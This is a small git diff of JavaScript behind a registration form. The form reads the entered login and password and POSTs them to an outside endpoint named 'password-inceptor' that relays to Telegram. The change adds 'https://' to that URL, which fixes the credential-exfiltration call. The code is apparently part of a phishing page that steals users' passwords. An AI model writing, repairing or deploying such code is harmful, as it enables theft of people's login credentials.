@@ -4,7 +4,7 @@ document.getElementById('registerForm').addEventListener('submit', function(even
     const login = document.getElementById('login').value;
     const password = document.getElementById('password').value;
 
-    const response = await fetch('password-inceptor.vercel.app/api/sendTelegram', {
+    const response = await fetch('https://password-inceptor.vercel.app/api/sendTelegram', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
